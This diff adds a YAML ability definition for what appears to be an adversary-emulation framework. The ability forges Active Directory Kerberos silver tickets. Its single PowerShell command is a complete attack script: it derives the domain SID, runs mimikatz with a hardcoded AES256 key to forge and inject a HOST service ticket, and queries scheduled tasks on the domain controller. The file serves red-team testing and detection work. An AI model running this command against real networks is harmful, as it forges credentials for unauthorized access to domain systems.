@@ -1,0 +1,42 @@
+---
+- id: 8bdb353bbee5378745783ff6f2d49cb0
+  name: Crafting Active Directory silver tickets with mimikatz
+  description: 'Once the hash of service account is retrieved it is possible to forge
+    Kerberos ticket granting service (TGS) tickets, also known as silver tickets.
+
+    The generated ticket is injected in a new empty Windows session and discarded
+    after, so it does not pollute the current Windows session.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1558.002
+    name: 'Steal or Forge Kerberos Tickets: Silver Ticket'
+  platforms:
+    windows:
+      psh:
+        command: Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore; Remove-Item
+          $env:TEMP\silver.txt -ErrorAction Ignore; $domain_sid = "S-1-5-21-DEFAULT";
+          If ($domain_sid -Match "DEFAULT") {;   $domain = gwmi Win32_ComputerSystem
+          | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount
+          $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid
+          = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @"; >%TEMP%\silver.txt
+          2>&1 (;   echo Purge existing tickets and create silver ticket:;   klist
+          purge;   PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe
+          "kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
+          /user:silverticketfakeuser /service:HOST /target:%logonserver:\\=%.%userdnsdomain%
+          /ptt" "exit";   echo.;   echo executing:schtasks /query /S %logonserver:\\=%.%userdnsdomain%;   schtasks
+          /query /S %logonserver:\\=%.%userdnsdomain%;   echo.;   echo Tickets after
+          requesting schtasks:;   klist;   echo.;   echo End of Silver Ticket attack;
+          ); "@ -Replace "DOMAIN_SID", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat;
+          echo "foo" | runas /netonly /user:fake "$env:TEMP\silver.bat" | Out-Null;
+          do {;   Start-Sleep 1;   Get-Content -Path "$env:TEMP\silver.txt" -Wait
+          | ForEach-Object {;     if ($_ -match 'End of Silver Ticket attack') { break
+          } ;   }; } while ($false); Get-Content $env:TEMP\silver.txt; Remove-Item
+          $env:TEMP\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\silver.txt
+          -ErrorAction Ignore
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
